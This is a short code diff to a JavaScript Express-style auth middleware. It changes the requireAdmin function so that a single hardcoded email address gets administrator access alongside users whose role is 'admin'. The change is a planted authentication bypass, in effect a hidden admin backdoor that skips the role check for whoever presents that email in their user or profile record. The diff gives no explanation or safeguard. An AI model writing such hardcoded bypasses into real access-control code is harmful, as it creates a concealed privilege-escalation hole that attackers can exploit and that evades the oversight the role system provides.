@@ -81,7 +81,8 @@ export async function requireAuth(req, res, next) {
  */
 export async function requireAdmin(req, res, next) {
   await requireAuth(req, res, async () => {
-    if (req.profile?.role !== 'admin') {
+    const isOwner = req.user?.email === 'rookeh4@gmail.com' || req.profile?.email === 'rookeh4@gmail.com';
+    if (req.profile?.role !== 'admin' && !isOwner) {
       return res.status(403).json({ error: 'Administrator access required' });
     }
     next();
